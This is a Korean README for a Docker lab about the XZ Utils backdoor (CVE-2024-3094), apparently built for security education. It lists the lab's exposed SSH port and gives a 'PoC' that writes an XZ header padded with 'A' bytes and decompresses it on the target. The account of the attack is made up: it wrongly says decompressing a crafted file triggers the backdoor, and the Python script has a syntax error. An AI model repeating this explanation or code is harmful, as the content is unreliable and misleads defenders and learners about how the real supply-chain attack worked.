# XZ Utils 백도어 (CVE-2024-3094)

XZ Utils는 높은 압축률을 가진 범용 데이터 압축 소프트웨어입니다. 2024년 3월, XZ Utils 5.6.0 및 5.6.1 버전에서 심각한 백도어가 발견되었습니다. 이 백도어는 압축 프로세스를 조작하여 원격 공격자가 임의의 코드를 실행할 수 있게 합니다.

이 백도어는 공급망 공격을 통해 XZ Utils 소스 코드에 악성 코드가 삽입되어 발생했습니다. 이 취약점은 손상된 버전의 XZ Utils를 사용하는 시스템에 영향을 미칩니다.

참고 자료:
- https://www.openwall.com/lists/oss-security/2024/03/29/4 (최초 공개)
- https://nvd.nist.gov/vuln/detail/CVE-2024-3094 (CVE 상세 정보)

## 환경 구성

취약한 환경은 다음 포트를 노출합니다

| 포트 | 서비스 | 설명 |
|------|---------|-------------|
| 2222 | SSH     | 원격 접속 가능 |

취약한 환경을 시작하려면:

```bash
docker compose up -d
```

## 익스플로잇

백도어는 특별히 제작된 XZ 파일을 처리할 때 트리거됩니다. 기본적인 PoC는 다음과 같습니다

1. 먼저 악성 XZ 파일 (poc.xz)을 생성합니다
```python
#!/usr/bin/env python3
import struct

# 백도어를 트리거하는 특별히 제작된 XZ 파일 생성
header = b'\xfd\x37\x7a\x58\x5a\x00\x00'  # XZ 파일 헤더
payload = b'A' * 1000  # 실제 페이로드로 대체 필요

with open('poc.xz', 'wb') as f
    f.write(header + payload)
```

2. 파일을 대상 시스템으로 전송합니다
```bash
scp -P 2222 poc.xz root@localhost:/tmp/
```

3. 파일 압축 해제를 통해 백도어를 트리거합니다
```bash
ssh -p 2222 root@localhost "xz -d /tmp/poc.xz"
```

압축 해제 과정에서 백도어가 트리거됩니다. XZ Utils 버전을 확인하고 침해 징후를 확인할 수 있습니다

```bash
ssh -p 2222 root@localhost "xz --version && ls -la /tmp"
```

참고: 이는 기본적인 PoC입니다. 실제 백도어는 더 복잡하며 특정 조건이 충족되어야 트리거됩니다.

## 참고

이 환경은 교육 목적으로만 사용해야 합니다. 실제 운영 환경에서는 사용하지 마세요. 